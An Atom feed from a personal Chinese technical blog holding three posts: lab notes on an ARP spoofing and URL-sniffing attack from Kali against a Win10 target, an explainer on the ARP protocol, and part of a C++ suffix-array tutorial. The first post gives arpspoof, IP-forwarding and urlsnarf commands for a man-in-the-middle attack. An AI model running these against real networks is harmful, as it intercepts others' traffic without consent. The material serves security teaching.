<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://MangPumo.github.io</id>
    <title></title>
    <subtitle>翩若浮云着霓裳，落幕鬓边皆染霜</subtitle>
    <icon>https://mangpumo.github.io/images/favicon.ico</icon>
    <link href="https://MangPumo.github.io" />
    <author>
      <name>Mang Pumo</name>
    </author>
    <updated>2023-01-14T06:44:01.000Z</updated>
    <entry>
        <id>https://mangpumo.github.io/2023/01/14/ARP%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
        <title>ARP攻击流量分析</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/14/ARP%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
        <content type="html">&lt;h1 id=&#34;ARP攻击-流量分析&#34;&gt;&lt;a href=&#34;#ARP攻击-流量分析&#34; class=&#34;headerlink&#34; title=&#34;ARP攻击-流量分析&#34;&gt;&lt;/a&gt;ARP攻击-流量分析&lt;/h1&gt;&lt;h2 id=&#34;1-课前准备&#34;&gt;&lt;a href=&#34;#1-课前准备&#34; class=&#34;headerlink&#34; title=&#34;1.课前准备&#34;&gt;&lt;/a&gt;1.课前准备&lt;/h2&gt;&lt;p&gt;1.kali作为攻击机&lt;/p&gt;
&lt;p&gt;2.win10作为靶机&lt;/p&gt;
&lt;h2 id=&#34;2-kali数据包转发&#34;&gt;&lt;a href=&#34;#2-kali数据包转发&#34; class=&#34;headerlink&#34; title=&#34;2.kali数据包转发&#34;&gt;&lt;/a&gt;2.kali数据包转发&lt;/h2&gt;&lt;p&gt;出于安全考虑，Linux系统默认是禁止数据包转发的。所谓转发即当主机拥有多于一块的网卡时，其中一块收到数据包，根据数据包的目的ip地址将数据包发往本机另一块网卡，该网卡根据路由表继续发送数据包。这通常是路由器所要实现的功能。我们需要手动开启转发功能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.如何开启通信转发？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;kali里有个ip_forward 配置文件 &lt;/p&gt;
&lt;p&gt;1.默认是0 禁止端口转发&lt;/p&gt;
&lt;p&gt;2.将其设置成1 开启端口转发&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.开启步骤&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.查看当前是否开启了端口转发&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /proc/sys/net/ipv4/ip_forward &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;2.开启通信转发的命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo 1 &amp;gt;&amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;3.使用arpspoof发起ARP攻击&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;4.win10验证是否转发成功&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;访问：https://www.mashibing.com/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;3-dsniff工具&#34;&gt;&lt;a href=&#34;#3-dsniff工具&#34; class=&#34;headerlink&#34; title=&#34;3.dsniff工具&#34;&gt;&lt;/a&gt;3.dsniff工具&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.工具介绍&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Dsniff是一个基于unix系统网络嗅探工具，工具集包含两个我们需要的两个工具包，arpspoof 和urlsnarf。              &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.安装方法&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt-get install dsniff&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;3.urlsnarf工具介绍&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;urlsnarf -h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;urlsnarf [-n] [-i interface | -p pcapfile] [[-v] pattern [expression]]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-n 表示不反查主机名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-i interface 网卡接口名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-p pattern 表示对过滤的内容使用的正则表达式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-v表示取相反，即是不匹配；expression 是过滤语法，和tcpdump的相同，请参考tcpdump。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;4-url流量分析&#34;&gt;&lt;a href=&#34;#4-url流量分析&#34; class=&#34;headerlink&#34; title=&#34;4.url流量分析&#34;&gt;&lt;/a&gt;4.url流量分析&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.概念&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;URL流量嗅探操作非常类似于中间人攻击，通过目标主机将路由流量注入到因特网。该过程将通过ARP注入实现攻击。url嗅探能够实时跟踪电脑中的数据流量信息，并且分析出它的类型和去向。从而获得你上网信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.攻击流程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.开启流量转发&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo 1 &amp;gt;&amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;2.开启ARP攻击&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;3.捕获目标计算机的url&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;urlsnarf -i eth0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;4.靶机上网，访问网站&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.http://blog.tianya.cn/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;5.kali分析用户请求&lt;/p&gt;
&lt;h2 id=&#34;5-课堂小结&#34;&gt;&lt;a href=&#34;#5-课堂小结&#34; class=&#34;headerlink&#34; title=&#34;5.课堂小结&#34;&gt;&lt;/a&gt;5.课堂小结&lt;/h2&gt;&lt;p&gt;请看ARP流量分析课后笔记.xmind&lt;/p&gt;
</content>
        <updated>2023-01-14T06:44:01.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/14/ARP%E5%8D%8F%E8%AE%AE/</id>
        <title>ARP协议</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/14/ARP%E5%8D%8F%E8%AE%AE/"/>
        <content type="html">&lt;h1 id=&#34;ARP协议&#34;&gt;&lt;a href=&#34;#ARP协议&#34; class=&#34;headerlink&#34; title=&#34;ARP协议&#34;&gt;&lt;/a&gt;ARP协议&lt;/h1&gt;&lt;h2 id=&#34;一-课前准备&#34;&gt;&lt;a href=&#34;#一-课前准备&#34; class=&#34;headerlink&#34; title=&#34;一.课前准备&#34;&gt;&lt;/a&gt;一.课前准备&lt;/h2&gt;&lt;p&gt;1.准备kali虚拟机 （原理演示机）&lt;/p&gt;
&lt;p&gt;2.准备centos7虚拟机 （靶机）&lt;/p&gt;
&lt;h2 id=&#34;二-ARP协议工作原理&#34;&gt;&lt;a href=&#34;#二-ARP协议工作原理&#34; class=&#34;headerlink&#34; title=&#34;二.ARP协议工作原理&#34;&gt;&lt;/a&gt;二.ARP协议工作原理&lt;/h2&gt;&lt;h4 id=&#34;什么是ARP&#34;&gt;&lt;a href=&#34;#什么是ARP&#34; class=&#34;headerlink&#34; title=&#34;什么是ARP&#34;&gt;&lt;/a&gt;什么是ARP&lt;/h4&gt;&lt;p&gt;地址解析协议，即ARP（Address Resolution Protocol），是根据&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9JUCVFNSU5QyVCMCVFNSU5RCU4MA==&#34;&gt;IP地址&lt;/span&gt;获取&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclODklQTklRTclOTAlODYlRTUlOUMlQjAlRTUlOUQlODAvMjEyOQ==&#34;&gt;物理地址&lt;/span&gt;的一个&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9UQ1AlMkZJUCVFNSU4RCU4RiVFOCVBRSVBRQ==&#34;&gt;TCP&amp;#x2F;IP协议&lt;/span&gt;。&lt;/p&gt;
&lt;h4 id=&#34;工作原理&#34;&gt;&lt;a href=&#34;#工作原理&#34; class=&#34;headerlink&#34; title=&#34;工作原理&#34;&gt;&lt;/a&gt;工作原理&lt;/h4&gt;&lt;p&gt;ARP协议规定,每台计算机都需要一个ARP表,用来保存IP地址和MAC地址的映射关系 。访问IP地址的时候就去查ARP表,从而找到对应的MAC地址。&lt;/p&gt;
&lt;p&gt;如果ARP表中匹配不到,就会使用广播的方式发送一个ARP请求 ，目标主机收到请求后会使用单播的方式返回一个ARP响应,告知自己的MAC地址 。&lt;/p&gt;
&lt;p&gt;拿到MAC地址后,会将映射关系缓存到ARP表,而后传递到数据链路层进行解析转换。&lt;/p&gt;
&lt;h2 id=&#34;三-ARP-协议的作用&#34;&gt;&lt;a href=&#34;#三-ARP-协议的作用&#34; class=&#34;headerlink&#34; title=&#34;三.ARP 协议的作用&#34;&gt;&lt;/a&gt;三.ARP 协议的作用&lt;/h2&gt;&lt;p&gt;网络中的数据传输所依赖的是MAC地址而不是IP地址，ARP协议负责将IP地址转换为MAC地址。&lt;/p&gt;
&lt;p&gt;ARP协议的主要工作就是建立、查询、更新、删除ARP表项。&lt;/p&gt;
&lt;h2 id=&#34;四-ARP常用命令&#34;&gt;&lt;a href=&#34;#四-ARP常用命令&#34; class=&#34;headerlink&#34; title=&#34;四.ARP常用命令&#34;&gt;&lt;/a&gt;四.ARP常用命令&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;查询arp表：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arp -a   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img data-src=&#34;/.%5Cimage-20211018181543457.png&#34; alt=&#34;image-20211018181543457&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.删除表内某个IP&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arp -d IP      &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;3.tcp抓某块网卡的所有arp请求  &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tcpdump -i eth0 -nn arp     &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;4.tcp抓取指定ip的请求&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tcpdump -i eth0 -nn arp  and host IP     &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​         &lt;/p&gt;
&lt;h2 id=&#34;五-ARP工作过程演示&#34;&gt;&lt;a href=&#34;#五-ARP工作过程演示&#34; class=&#34;headerlink&#34; title=&#34;五.ARP工作过程演示&#34;&gt;&lt;/a&gt;五.ARP工作过程演示&lt;/h2&gt;&lt;p&gt;在centos7上通过抓包来了解arp的工作过程：&lt;/p&gt;
&lt;p&gt;1.首先查看一下该机器有没有 ip:192.168.110.13 的mac地址&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arp -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果存在则先删除掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;arp -d IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;2.在centos7上抓包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tcpdump -i eth0 -nn arp  或者 tcpdump -i eth0 -nn arp and host 192.168.110.13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;3.ping一下该ip&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ping 192.168.110.13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;4.查看抓包结果&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;06:07:58.827256 ARP, Request who-has 192.168.110.13 tell 192.168.110.26, length 28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这句话的意思是，请问谁是192.168.110.13 ，请将你的mac地址告诉给 192.168.110.26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;06:07:58.827858 ARP, Reply 192.168.110.13 is-at 00:0c:29:90:e6:8d, length 46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这句话的意思是，我是92.168.110.13，我的mac地址是：00:0c:29:90:e6:8d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;5.查看最新的ARP表，看看是否绑定了mac地址&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arp -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;? (192.168.110.13) at 00:0c:29:90:e6:8d [ether] on eth0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;6.ARP的请求是一直不间断的在自动发送的，一台计算机会通信进行以下过程&lt;/p&gt;
&lt;p&gt;1.主动询问网段下的IP的MAC地址&lt;/p&gt;
&lt;p&gt;2.主动告诉别人我的IP和MAC地址&lt;/p&gt;
&lt;p&gt;3.根据应答结果实时更新ARP表的绑定关系&lt;/p&gt;
&lt;h2 id=&#34;六-课堂总结&#34;&gt;&lt;a href=&#34;#六-课堂总结&#34; class=&#34;headerlink&#34; title=&#34;六.课堂总结&#34;&gt;&lt;/a&gt;六.课堂总结&lt;/h2&gt;&lt;p&gt;1.ARP协议负责将IP地址转换为MAC地址。或者说 ARP协议负责将IP地址和MAC地址进行绑定。&lt;/p&gt;
&lt;p&gt;2.ARP协议的主要工作就是建立、查询、更新、删除ARP表项。&lt;/p&gt;
&lt;p&gt;3.ARP的特性：无需人为干预，一直在进行轮询和应答&lt;/p&gt;
</content>
        <updated>2023-01-14T06:11:19.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/14/CPP%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/</id>
        <title>CPP后缀数组</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/14/CPP%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/"/>
        <content type="html">&lt;h1 id=&#34;为什么学后缀数组&#34;&gt;&lt;a href=&#34;#为什么学后缀数组&#34; class=&#34;headerlink&#34; title=&#34;为什么学后缀数组&#34;&gt;&lt;/a&gt;为什么学后缀数组&lt;/h1&gt;&lt;p&gt;后缀数组是一个比较强大的处理字符串的算法，是有关字符串的基础算法，所以必须掌握。&lt;br&gt;学会后缀自动机(SAM)就不用学后缀数组(SA)了？不，虽然SAM看起来更为强大和全面，但是有些SAM解决不了的问题能被SA解决，只掌握SAM是远远不够的。  &lt;/p&gt;
&lt;p&gt;有什么SAM做不了的例子？&lt;br&gt;比如果求一个串后缀的lcp方面的应用，这是SA可以很方便的用rmq来维护，但是SAM还要求lca，比较麻烦，还有就是字符集比较大的时候SA也有优势。  &lt;/p&gt;
&lt;p&gt;现在这里放道题，看完这个blog可能就会做了！：&lt;br&gt;你可想想这道题：你有一个01串S，然后定义一个前缀最右边的位置就是这个前缀的结束位置。现在有q多个询问，每个询问结束位置在l~r中不同前缀的最长公共后缀是多长？&lt;br&gt;|S|,q≤100000|S|,q≤100000  &lt;/p&gt;
&lt;p&gt;时限4s  &lt;/p&gt;
&lt;p&gt;而下面是我对后缀数组的一些理解  &lt;/p&gt;
&lt;h1 id=&#34;构造后缀数组——SA&#34;&gt;&lt;a href=&#34;#构造后缀数组——SA&#34; class=&#34;headerlink&#34; title=&#34;构造后缀数组——SA&#34;&gt;&lt;/a&gt;构造后缀数组——SA&lt;/h1&gt;&lt;h2 id=&#34;先定义一些变量的含义&#34;&gt;&lt;a href=&#34;#先定义一些变量的含义&#34; class=&#34;headerlink&#34; title=&#34;先定义一些变量的含义&#34;&gt;&lt;/a&gt;先定义一些变量的含义&lt;/h2&gt;&lt;p&gt;Str ：需要处理的字符串(长度为Len)&lt;br&gt;Suffix[i] ：Str下标为i ~ Len的连续子串(即后缀)&lt;br&gt;Rank[i] : Suffix[i]在所有后缀中的排名&lt;br&gt;SA[i] : 满足Suffix[SA[1]] &amp;lt; Suffix[SA[2]] …… &amp;lt; Suffix[SA[Len]],即排名为i的后缀为Suffix[SA[i]] (与Rank是互逆运算)&lt;br&gt;好，来形象的理解一下  &lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20160205125505545&#34;&gt;&lt;/p&gt;
&lt;p&gt;后缀数组指的就是这个SA[i],有了它，我们就可以实现一些很强大的功能(如不相同子串个数、连续重复子串等)。如何快速的到它，便成为了这个算法的关键。而SA和Rank是互逆的，只要求出任意一个，另一个就可以O(Len)得到。&lt;br&gt;现在比较主流的算法有两种，倍增和DC3，在这里，就主要讲一下稍微慢一些，但比较好实现以及理解的倍增算法(虽说慢，但也是O(Len logLen))的。  &lt;/p&gt;
&lt;h2 id=&#34;进入正题——倍增算法&#34;&gt;&lt;a href=&#34;#进入正题——倍增算法&#34; class=&#34;headerlink&#34; title=&#34;进入正题——倍增算法&#34;&gt;&lt;/a&gt;进入正题——倍增算法&lt;/h2&gt;&lt;p&gt;倍增算法的主要思想 ：对于一个后缀Suffix[i],如果想直接得到Rank比较困难，但是我们可以对每个字符开始的长度为2k2k的字符串求出排名，k从0开始每次递增1(每递增1就成为一轮)，当2k2k大于Len时，所得到的序列就是Rank，而SA也就知道了。O(logLen)枚举k&lt;br&gt;这样做有什么好处呢？&lt;br&gt;设每一轮得到的序列为rank(注意r是小写，最终后缀排名Rank是大写)。有一个很美妙的性质就出现了！第k轮的rank可由第k - 1轮的rank快速得来!&lt;br&gt;为什么呢？为了方便描述，设SubStr(i, len)为从第i个字符开始，长度为len的字符串我们可以把第k轮SubStr(i, 2k2k)看成是一个由SubStr(i, 2k−12k−1)和SubStr(i + 2k−12k−1, 2k−12k−1)拼起来的东西。类似rmq算法，这两个长度而2k−12k−1的字符串是上一轮遇到过的！当然上一轮的rank也知道！那么吧每个这一轮的字符串都转化为这种形式，并且大家都知道字符串的比较是从左往右，左边和右边的大小我们可以用上一轮的rank表示，那么……这不就是一些两位数(也可以视为第一关键字和第二关键字)比较大小吗!再把这些两位数重新排名就是这一轮的rank。&lt;br&gt;我们用下面这张经典的图理解一下：  &lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20160205125603928&#34;&gt;&lt;/p&gt;
&lt;p&gt;相信只要理解字符串的比较法则(跟实数差不多)，理解起来并不难。#还有一个细节就是怎么把这些两位数排序？这种位数少的数进行排序毫无疑问的要用一个复杂度为长度*排序数的个数的优美算法——基数排序(对于两位数的数复杂度就是O(Len)的)。&lt;br&gt;基数排序原理 ： 把数字依次按照由低位到高位依次排序，排序时只看当前位。对于每一位排序时，因为上一位已经是有序的，所以这一位相等或符合大小条件时就不用交换位置，如果不符合大小条件就交换，实现可以用”桶”来做。(叙说起来比较奇怪，看完下面的代码应该更好理解，也可以上网查有关资料)&lt;br&gt;好了SA和Rank(大写R)到此为止就处理好了。(下面有详解代码！)。但我们发现，只有这两样东西好像没什么用，为了处理重复子串之类的问题，我们就要引入一个表示最长公共前缀的新助手Height数组！  &lt;/p&gt;
